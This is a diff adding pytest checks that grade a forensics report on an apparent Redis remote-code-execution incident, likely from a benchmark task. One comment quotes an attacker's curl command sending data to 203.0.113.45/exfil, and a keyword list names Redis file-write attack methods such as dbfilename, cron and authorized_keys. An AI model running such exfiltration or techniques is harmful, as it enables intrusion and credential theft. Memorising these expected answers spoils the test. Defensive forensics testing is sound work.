@@ -90,11 +90,37 @@ def test_technique_identifies_exploitation_method():
     """Test that the technique correctly identifies how RCE was achieved"""
     report_path = Path("/tmp/forensics_report.txt")
     content = report_path.read_text()
-    
+
     match = re.search(r'TECHNIQUE:\s*(.+?)(?:\n|$)', content)
     assert match is not None, "TECHNIQUE field not found"
-    
+
     tech_content = match.group(1).strip().lower()
     # Check for indicators of file-writing exploitation techniques
     assert any(keyword in tech_content for keyword in ['config', 'cron', 'ssh', 'save', 'dir', 'dbfilename', 'authorized_keys', 'web shell']), \
         "TECHNIQUE does not identify a valid Redis exploitation method"
+
+def test_executed_command_contains_curl_exfil():
+    """Test that EXECUTED_COMMAND identifies the curl data exfiltration from system logs"""
+    report_path = Path("/tmp/forensics_report.txt")
+    content = report_path.read_text()
+
+    match = re.search(r'EXECUTED_COMMAND:\s*(.+?)(?:\n|$)', content)
+    assert match is not None, "EXECUTED_COMMAND field not found"
+
+    cmd_content = match.group(1).strip()
+    # The system logs show: curl http://203.0.113.45:8080/exfil?data=...
+    assert '203.0.113.45' in cmd_content, \
+        f"EXECUTED_COMMAND should contain attacker IP 203.0.113.45, got: {cmd_content}"
+
+def test_exfiltrated_data_contains_password():
+    """Test that EXFILTRATED_DATA identifies the production DB password from system logs"""
+    report_path = Path("/tmp/forensics_report.txt")
+    content = report_path.read_text()
+
+    match = re.search(r'EXFILTRATED_DATA:\s*(.+?)(?:\n|$)', content)
+    assert match is not None, "EXFILTRATED_DATA field not found"
+
+    data_content = match.group(1).strip()
+    # System logs show data exfiltration URL contains: prod_db_pass_Xy89Kl2mP
+    assert 'prod_db_pass' in data_content or 'Xy89Kl2mP' in data_content, \
+        f"EXFILTRATED_DATA should reference the production DB password (prod_db_pass_Xy89Kl2mP), got: {data_content}"
